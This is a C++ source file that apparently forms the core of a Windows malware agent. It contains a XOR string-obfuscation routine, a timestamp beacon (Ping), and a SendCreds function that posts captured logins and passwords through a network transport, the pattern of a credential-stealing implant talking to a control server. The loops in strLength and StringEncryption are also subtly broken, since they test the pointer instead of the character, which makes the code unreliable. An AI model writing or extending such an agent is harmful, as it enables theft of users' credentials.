#include <windows.h>
#include <sstream>
#include "transport.h"
#include "agent.h"



inline auto strLength(char* str) {
	unsigned size = 0;
	for (char* s = str; s; s++, size++);
	return size;
}

Agent::Agent(Transport* tr) : transport(tr) {}
Agent::Agent() { transport = NULL; }

void Agent::SetTransport(Transport* tr) {
	transport = tr;
}

char *Agent::StringEncryption(char* text, char* key) noexcept{
	auto len = strLength(key);
	size_t i = 0;
	for (auto c = text; c; c++, i++) {
		*c ^= key[i % len];
	}
	return text;
}

void Agent::ClearBuffer(void* buffer, size_t len) noexcept {
	memset(buffer, 0x0, len);
}

int Agent::Ping() {
	std::time_t currentTime;
	std::wstringstream ss;
	time(&currentTime);
	ss << currentTime;

	std::wstring postData{
		L"time=" + ss.str()
	};
	return transport->SendData(LPVOID(postData.c_str()), postData.length(), RAW_DATA);
}

int Agent::SendCreds(const std::wstring &login, const std::wstring &password) const noexcept{
	std::wstring postData = {
		L"login=" + login + L"&password=" + password
	};
	auto res = transport->SendData(LPVOID(postData.c_str()),
		postData.length() * sizeof(wchar_t), X_WWW_FORM);
	return res;
}
